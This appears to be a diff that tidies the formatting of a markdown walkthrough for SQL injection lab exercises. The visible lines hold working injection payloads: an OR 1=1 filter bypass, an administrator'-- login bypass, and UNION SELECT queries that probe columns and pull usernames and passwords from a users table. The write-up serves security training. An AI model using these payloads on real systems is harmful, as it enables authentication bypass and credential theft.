@@ -29,7 +29,7 @@ We have a payload `?category=Clothing,+shoes+and+accessories'+OR+1=1--`. ***Sinc
 Solution:
 
 Login with the username **administrator'--** and with anything as a password.
-We have a payload as `username=administrator'--&password=123**.`
+We have a payload as `username=administrator'--&password=123.`
 Because of the SQL comment **--**. It removes the query password from the original query.
 
 ## Retrieving data from other database tables
@@ -73,7 +73,7 @@ Require:
 Solution:
 
 The first, as seen in the lab above, returns three columns.
-We have a payload `'+UNION+SELECT+NULL,'*random value*',NULL--` to test which column contains available string data. And we have completed it.
+We have a payload `'+UNION+SELECT+NULL,'random value',NULL--` to test which column contains available string data. And we have completed it.
 
 ### Using a SQL injection UNION attack to retrieve interesting data
 
@@ -278,4 +278,3 @@ Now, after knowing that one column is returned, we need to know about the table 
 > From my experience in the above labs, I can easily find table names that include *username* and *password*
 
 After knowing about its columns, we will extract data from them. Because only one column is returned, we have the payload as `<@html_entities>UNION SELECT username||'~'||password FROM users--<@/html_entities>`.
-
